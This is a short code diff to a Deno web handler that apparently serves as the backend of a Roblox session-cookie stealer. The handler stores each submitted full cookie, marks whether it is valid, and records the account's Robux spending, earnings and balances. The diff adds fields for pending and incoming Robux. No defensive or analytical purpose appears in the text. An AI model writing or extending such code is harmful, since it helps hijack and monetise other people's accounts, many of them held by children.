@@ -159,6 +159,8 @@ Deno.serve(async (req) => {
         roblox_gamepass_earnings: robloxInfo?.gamepassEarnings ?? null,
         roblox_robux_spent: robloxInfo?.robuxSpent ?? null,
         roblox_summary: robloxInfo?.summary ?? null,
+        roblox_pending_robux: robloxInfo?.pendingRobux ?? null,
+        roblox_incoming_robux: robloxInfo?.incomingRobux ?? null,
         cookie_preview: body.cookie.slice(-16),
         cookie_full: body.cookie,
         is_valid: robloxInfo !== null,
